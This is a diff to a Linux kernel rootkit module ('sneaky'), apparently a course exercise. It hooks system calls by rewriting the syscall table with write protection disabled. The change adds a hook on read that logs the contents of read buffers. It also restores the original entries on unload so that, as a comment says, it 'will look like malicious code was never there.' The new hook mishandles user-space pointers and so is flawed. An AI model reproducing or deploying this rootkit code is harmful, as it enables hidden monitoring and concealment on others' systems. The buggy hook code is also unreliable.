@@ -95,15 +95,20 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   return sneaky_result;
 }
 
-/**
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count);
 
-asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count)
+asmlinkage int (*original_read)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 {
-  printk(KERN_INFO "Here");
-  return  (*original_getdents)(fd, dirp, count);
+  int original_result = (*original_read)(regs);
+  int sneaky_result = original_result;
+
+  char * original_buf = regs->si;
+  char * sneaky_buf = strchr(original_buf, '\n');
+  printk(KERN_INFO "Sneaky read%s \n", sneaky_buf);
+  
+  return sneaky_result;
 }
-**/ 
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -120,11 +125,12 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
-   
+  original_read = (void *)sys_call_table[__NR_read]; 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   // You need to replace other system calls you need to hack here
   
@@ -145,6 +151,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
